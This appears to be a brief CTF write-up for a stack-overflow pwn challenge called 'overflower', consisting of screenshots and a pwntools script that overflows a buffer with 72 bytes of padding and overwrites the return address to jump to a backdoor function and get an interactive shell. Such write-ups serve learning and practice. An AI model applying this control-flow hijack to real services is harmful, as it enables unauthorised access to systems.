---
title: overflower
date: '2025-6-14 22:00'
categories:
  - PWN
  - 栈溢出（Stack Overflow）
---
![](/images/{705048A9-C62E-4272-B122-5AF2FADA48EF}.png)
![](/images/Pastedimage20250615160603.png)
![](/images/Pastedimage20250615160614.png)
![](/images/Pastedimage20250615160623.png)
![](/images/Pastedimage20250615160632.png)

```python
from pwn import *

p = remote(' ',端口号)  

backdoor_addr = 0x401146  

payload = b'A' * 72 +p64(0x40115B) + p64(backdoor_addr)

p.sendline(payload)  

p.interactive()
```
![](/images/Pastedimage20250615160703.png)